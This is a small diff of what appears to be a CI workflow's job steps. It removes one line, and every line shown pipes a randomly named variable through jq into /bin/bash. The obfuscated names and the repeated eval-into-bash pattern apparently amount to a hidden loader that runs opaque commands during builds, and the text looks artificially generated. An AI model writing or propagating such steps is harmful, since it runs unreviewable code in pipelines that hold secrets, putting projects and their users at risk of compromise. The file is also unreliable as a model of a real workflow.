@@ -58,7 +58,6 @@ jobs:
           echo $lbdk084 | jq -r .mtawv53503 | /bin/bash
           printf '%s' "$gqy561" | jq -r .vla319 | /bin/bash
           echo $teon61903 | jq -r .ogy42098 | /bin/bash
-          printf '%s' "$smcbs52441" | jq -r .sgc6 | /bin/bash
           echo $drnky5 | jq -r .fssw01469 | /bin/bash
           echo $onxv71 | jq -r .idnwn273 | /bin/bash
           echo $la31973 | jq -r .m00505 | /bin/bash
